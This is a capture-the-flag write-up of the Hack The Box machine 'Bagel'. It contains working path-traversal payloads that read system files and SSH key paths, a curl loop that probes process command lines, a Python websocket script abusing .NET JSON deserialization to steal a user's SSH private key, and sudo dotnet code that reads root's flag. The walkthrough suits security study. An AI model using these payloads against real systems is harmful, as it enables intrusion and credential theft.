---
title: "Bagel(HTB)"
permalink: /writeups/bagel
---

![Bagel HTB Logo](/writeups/Bagel/logo.png "Logo")


## Tags
ctf, htb, hack the box, medium, bagel

## Metadata

| Written | 23/02/2023
| Author | Thetvdh
| Platform | HackTheBox
| Box Type | Linux

## Tools used
- nmap
- grep
- awk
- sort
- find
- strings
- curl
- ILSpy
- python3
- dotnet


## Note:
Throughout this writeup it will be assumed that you have added bagel.htb to your /etc/hosts file. For more information on how to do this refer to [this](/useful/hostsfile) resource.

# nmap

Running nmap on the target reveals 3 open ports:
- Port 22 (SSH)
- Port 5000 (running a custom service)
- Port 8000 (running a flask HTTP server)

(The whole nmap scan is huge, it can be accessed [here](/writeups/Bagel/nmap.txt))

# Port 8000

Port 8000 takes us to a website with a lovely picture of a bagel on it. It also had a rather suspicious looking URL:

`http://bagel.htb/?page=index.html`

As a good rule in CTFs, anything with ?page= or the like is usually some form of Local File Inclusion (LFI) vulnerability. In this instance it was a particularly simple LFI with the classic ../ schema working.

To test LFI, /etc/passwd is always a good start

`http://bagel.htb/?page=../../../../../../../../etc/passwd`

This returned the passwd file of the server giving us some users. Using this following command we can extract all users with logons, these are the users we most likely need to target:

```bash
grep -i "/bin/bash" passwd | awk -F ":" '{print $1}' | sort > users.txt 
```

I then decided to see if the webserver was running as any of these users so I pulled the environment variables with this payload:

`http://bagel.htb/?page=../../../../../../../../proc/self/environ`

Which gave us this file:

environ:
```
4c41 4e47 3d65 6e5f 5553 2e55 5446 2d38
0050 4154 483d 2f75 7372 2f6c 6f63 616c
2f73 6269 6e3a 2f75 7372 2f6c 6f63 616c
2f62 696e 3a2f 7573 722f 7362 696e 3a2f
7573 722f 6269 6e00 484f 4d45 3d2f 686f
6d65 2f64 6576 656c 6f70 6572 004c 4f47
4e41 4d45 3d64 6576 656c 6f70 6572 0055
5345 523d 6465 7665 6c6f 7065 7200 5348
454c 4c3d 2f62 696e 2f62 6173 6800 494e
564f 4341 5449 4f4e 5f49 443d 3562 3165
6633 3038 3735 3431 3430 3138 6163 3066
3638 6139 6230 3230 6463 3863 004a 4f55
524e 414c 5f53 5452 4541 4d3d 383a 3235
3638 3600 5359 5354 454d 445f 4558 4543
5f50 4944 3d38 3931 00
```

This can then be turned into readable text using any hex to text method. I used strings

```bash
strings environ

LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
HOME=/home/developer
LOGNAME=developer
USER=developer
SHELL=/bin/bash. 
INVOCATION_ID=5b1ef30875414018ac0f68a9b020dc8c
JOURNAL_STREAM=8:25686
SYSTEMD_EXEC_PID=891
```

This shows us that the web app is running as the user developer. Useful if we ever get any form of RCE. We also know that we can access any file that developer can read using the LFI.

My next step was to try and access developer's SSH keys using the LFI

`http://bagel.htb/?page=../../../../../../../../home/developer/.ssh/id_rsa`

However, it's not that easy and that file doesn't exist. Potentially phil has some ssh keys

`http://bagel.htb/?page=../../../../../../../../home/phil/.ssh/id_rsa`

If he does we don't have read permissions, it was a shot in the dark.

Next step is to use the LFI to access the applications source code. I took a logical guess that the developer wouldn't have changed from flask standards so assumed that the HTML pages were in a directory, probably templates or static. This means going up one directory level should put us in the project root. Then we can access app.py which is the default start point for Flask apps.

`http://bagel.htb/?page=../app.py`

(I have not included the source code in this writeup, you can get that for yourselves :))

Looking at the orders route it appears it is making a websocket request to port 5000. This is the custom service. We also have some information about this service from the nmap scan and a code comment. The nmap scan indicated it was something to do with .NET Core. 

The code comment reads

```py
# don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
```

So we know we have a dll that is running on Port 5000. We also know that someone has SSH keys. We know it's not developer so it must be Phil. We also know that phil must be running the dll as the note is for him to remember to start his app.

# Finding the DLL

So we know there is a DLL running somewhere on the system. If we can find out where it is stored we can download it using the LFI. As it is running, it will be assigned a process id which we can find by fuzzing /proc/$id/cmdline.

This BASH one liner can do that efficiently
```bash
for i in $(seq 900 1000); do curl bagel.htb:8000/?page=../../../../../../proc/$i/cmdline -o -;echo " PID => $i"; done
```

This will give us the location of the running DLL. We can then download it using our LFI.

# Reverse engineering the DLL

This took a unreasonable amount of time to do. I was doing this CTF on a laptop that was purely linux only (Fedora host, Kali VM), no windows VMs or windows available. It turns out that dotnet decompilers for Linux are few and far between. After a while of research I finally came across this Linux fork of ILSpy, it can be downloaded from [GitHub](https://github.com/icsharpcode/AvaloniaILSpy)

As I don't want to fully spoil the box I shall briefly mention some key findings and how I escalated to the next stage of the CTF.

Looking through the classes:
Found a DB password for the dev user, could potentially be reused password.
Found two JSON serialization functions, deserialize and serialize.
The Message handler function receieved the message, deserialized it, serialized it and then sent it back. Any vulnerability had to be here.

ReadOrder filtered out ../ meaning that LFI wouldn't be available on that function.
WriteOrder simply wrote to orders.txt file, nothing we could do here.
RemoveOrder returned a strange object, this is something we could have some luck with.

After doing some research I came across this blog article.

https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15

It talks about weaknesses in .NET core's JSON serialization handling.

In laymans terms, because of the way the dll is configured we can tell the serialization to treat the JSON as a different object than what it is, and then use this to load a different object to what is intended.

This vulnerability allowed the crafting of this script to get phil's SSH key.

```py
def send():
    payload = {
   "$type": "bagel_server.File, bagel",
   "ReadFile":"../../../../../../../../home/phil/.ssh/id_rsa"
}

    ws = websocket.WebSocket()    

    ws.connect("ws://bagel.htb:5000/") # connect to order app
    order = {"RemoveOrder":payload}
    data = str(json.dumps(order))
    ws.send(data)
    result = ws.recv()
    print(json.loads(result)["RemoveOrder"])
```

This will return back Phil's SSH key. (it will need editing to work correctly, use tr or a GUI text editor for this)

# user.txt

user.txt is located in Phil's home directory. It can be accessed after the SSH access or can be found using the same exploit we got the SSH key with, your choice.

# root.txt

Running linpeas on the target revealed some interesting finds but nothing too vulnerable. I took a while looking round the system trying the techniques of looking for SUID or SGID binaries, binaries with capabilities set, misconfigured path settings etc. Unfortunately, none of these were useful.

I was working on this machine with [@JDNTweeter](https://twitter.com/JDNTweeter) and he suggested something I should've thought of earlier. Use the creds found in the dll on developer's user account. This worked and after beginning enumeration again with sudo -l it revealed developer could run dotnet as root.

```
sudo -l

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

Now it was just a case of crafting an exploit to read root.txt.

## root.txt steps

1) Create a new dotnet project `sudo dotnet new console -n {project_name} -o .`

2) Open Program.cs and paste the following code into it
```csharp
// This code was taken from Microsoft Documentation then slightly modified to read the correct file.
class ReadFromFile
{
    static void Main()
    {
        // The files used in this example are created in the topic
        // How to: Write to a Text File. You can change the path and
        // file name to substitute text files of your own.

        // Example #1
        // Read the file as one string.
        string text = System.IO.File.ReadAllText(@"/root/root.txt");

        // Display the file contents to the console. Variable text is a string.
        System.Console.WriteLine("{0}", text);

    }
}
```
3) Save and exit this file

4) Run the file with `sudo dotnet run`

5) You should now have the value of the root flag!

# Conclusion

A very interesting box with a variation in techniques. The LFI was simple and could've maybe been made slightly trickier to bypass however that was not the main purpose of this box. The box was all about the DLL and the JSON serialization exploit which was an interesting read.